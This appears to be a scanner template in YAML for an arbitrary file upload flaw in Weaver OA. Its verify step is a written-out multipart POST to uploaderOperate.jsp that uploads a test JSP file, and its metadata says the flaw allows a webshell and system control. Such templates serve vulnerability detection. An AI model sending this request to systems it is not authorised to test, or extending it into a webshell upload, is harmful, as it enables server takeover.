app: Weaver
query: app:"Weaver"
meta:
  name: 泛微OA FileUpload任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 通过uploaderOperate上传，OfficeServer移动实现文件上传webshell获取系统权限
  homepage: ""
  author: X prism
  references: ""
  solution: 安装补丁、下载最新版
  create_at: "2024-07-13 11:39:48"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /workrelate/plan/util/uploaderOperate.jsp
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
          params: |-
            ------WebKitFormBoundaryVdb2RRl25PuaGhWj
            Content-Disposition: form-data; name="secId"

            1
            ------WebKitFormBoundaryVdb2RRl25PuaGhWj
            Content-Disposition: form-data; name="Filedata"; filename="cccc.jsp"

            test111


            ------WebKitFormBoundaryVdb2RRl25PuaGhWj
            Content-Disposition: form-data; name="plandetailid"

            1
            ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
        response:
        - name: body
          value: cccc.jsp
          type: contains
        - name: body
          value: 下载
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
